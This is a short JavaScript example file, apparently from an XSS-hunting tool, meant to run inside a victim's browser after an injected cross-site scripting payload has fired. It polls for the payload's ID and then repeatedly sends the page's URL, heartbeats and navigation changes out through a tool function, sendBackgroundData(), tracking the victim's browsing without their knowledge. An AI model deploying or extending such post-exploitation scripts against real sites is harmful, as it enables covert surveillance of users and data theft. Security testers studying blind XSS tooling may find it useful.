// Name: Simple Background Data Example  
// Description: Basic example showing how to use sendBackgroundData() for continuous monitoring after the initial payload fires

// Wait for payload ID to be available
setTimeout(function checkPayloadId() {
  if (!window.xssPayloadId) {
    // Payload hasn't fired yet, check again in 1 second
    setTimeout(checkPayloadId, 1000);
    return;
  }
  
  // Now we can start sending background data
  console.log('Background monitoring started for payload:', window.xssPayloadId);
  
  // Example 1: Send a simple heartbeat every 5 seconds
  setInterval(function() {
    window.sendBackgroundData({
      title: "Heartbeat",
      data: {
        message: "Page still active",
        currentUrl: location.href,
        timestamp: new Date().toISOString()
      }
    });
  }, 5000);
  
  // Example 2: Monitor for navigation changes
  let lastUrl = location.href;
  setInterval(function() {
    if (location.href !== lastUrl) {
      window.sendBackgroundData({
        title: "Navigation Detected",
        data: {
          from: lastUrl,
          to: location.href,
          timestamp: new Date().toISOString()
        }
      });
      lastUrl = location.href;
    }
  }, 1000);
  
}, 2000); // Start checking after 2 seconds